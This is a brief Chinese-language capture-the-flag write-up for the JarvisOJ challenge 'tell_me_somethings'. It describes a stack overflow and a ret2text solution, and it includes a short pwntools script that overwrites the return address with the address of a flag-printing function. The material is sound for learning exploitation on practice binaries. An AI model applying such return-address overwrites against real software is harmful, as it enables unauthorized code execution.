---
title: "Jarvisoj_tell_me_somethings"
description: ""
date: 2023-04-07T17:59:44+08:00
lastmod: 2023-04-07T17:59:44+08:00
draft: false
images: []
type: docs
weight: 978
toc: true
---

## 0x01 分析

![3a66c953b853bdf07979dad5e1ed8f6e](images/3a66c953b853bdf07979dad5e1ed8f6e.png)  

简单的栈溢出

![a78f15079c4421b440a5d83be7554913](images/a78f15079c4421b440a5d83be7554913.png)  

有一个打印flag的函数，所以直接ret2text即可

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
elf = ELF("./pwn")
good_game = elf.sym['good_game']
payload = b'a'*0x88 + p64(good_game)
o.sendline(payload)
o.interactive()

```

![1de2b1d1f48cb48006f13e2c74c63d46](images/1de2b1d1f48cb48006f13e2c74c63d46.png)  

自行调试
